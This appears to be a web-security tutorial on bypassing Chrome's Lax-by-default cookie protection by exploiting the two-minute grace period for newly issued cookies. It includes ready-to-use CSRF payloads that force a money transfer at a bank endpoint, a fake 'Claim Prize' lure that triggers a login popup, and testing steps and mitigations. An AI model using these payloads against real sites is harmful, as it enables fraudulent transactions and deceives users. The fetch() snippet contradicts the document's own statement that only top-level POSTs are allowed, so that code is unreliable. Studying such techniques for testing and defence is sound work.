# Bypassing SameSite Lax via Newly Issued Cookies

**Key Insight:**

- Chrome's Lax-by-default has 120-second grace period
- New cookies (no explicit SameSite) allow cross-site POST for 2 minutes
- Attack window: Fresh session cookies vulnerable immediately

---

Grace Period Details:

- Applies to: Cookies without explicit `SameSite` attribute
- Duration: 120 seconds (2 minutes) after cookie issuance
- Scope: Top-level POST requests allowed
- Purpose: Prevent SSO/OAuth breakage
- NOT for: Explicit `SameSite=Lax` cookies

---

Attack Strategy:

1. Force Cookie Refresh:

- Trigger new session issuance before attack
- Methods:
    - OAuth re-login flows
    - Session renewal endpoints
    - "Logout everywhere" → New login

2. Timing Attack:

```html
<!-- Within 2 minutes of new cookie -->
<form action="<https://bank.com/transfer>" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

```

**3**. Practical Challenge:

- 2-minute window too short for reliable timing
- Need to control when cookie gets refreshed

---

**Advanced Attack Flow:**

**Step 1: Force New Cookie (Popup)**

```html
<!-- User must click -->
<button onclick="
  window.open('<https://bank.com/oauth-login>');
  setTimeout(attack, 1000);
">Claim Prize</button>

```

**Step 2: Execute CSRF**

```jsx
function attack() {
  // New cookie (within 120s) allows cross-site POST
  fetch('<https://bank.com/transfer>', {
    method: 'POST',
    body: 'to=attacker&amount=1000',
    credentials: 'include'  // Cookies sent despite Lax
  });
}

```

---

**Cookie Refresh Techniques:**

**1. OAuth Re-Authorization:**

```
GET /oauth/authorize?client_id=app&redirect_uri=attacker.com
→ New session cookie issued

```

**2. Session Renewal Endpoints:**

```
POST /renew-session
→ Sets fresh cookie

```

**3. Logout → Auto-Login:**

```
GET /logout → GET /auto-login
→ New session

```

---

**Popup Bypass Requirements:**

- **User interaction required** (click, keypress)
- **Cannot auto-open** popups (blocked by browser)
- **Workaround:** Attach to click handler

```jsx
document.body.onclick = () => {
  window.open('<https://bank.com/refresh-session>');
  launchCSRF();
};

```

---

**Testing Methodology:**

1. **Check cookie attributes:**
    - `Set-Cookie` without `SameSite` = vulnerable
    - Note issuance timestamp
2. **Find cookie refresh endpoints:**
    - OAuth flows
    - Session renewal
    - Re-authentication
3. **Test within 2 minutes:**
    - Issue new cookie
    - Immediately attempt cross-site POST
    - Verify if cookies sent

---

**Impact:**

- **Medium risk** - Requires specific conditions
- **Exploitable** if cookie refresh controllable
- **Real threat** for OAuth-heavy applications

---

**Mitigation:**

**For Developers:**

1. **Explicitly set** `SameSite=Lax` or `Strict`
2. **Avoid** session re-issuance without need
3. **Implement CSRF tokens** regardless of SameSite

**For OAuth/SSO:**

- Use `SameSite=None; Secure` for cross-site needs
- Implement proper session state management
- Consider refresh token patterns

---

**Key Points:**

- **Default Lax ≠ Explicit Lax** (grace period difference)
- **2-minute window** exists for fresh default-Lax cookies
- **Attack requires** cookie refresh + timing coordination
- **Popup restrictions** add complexity but bypassable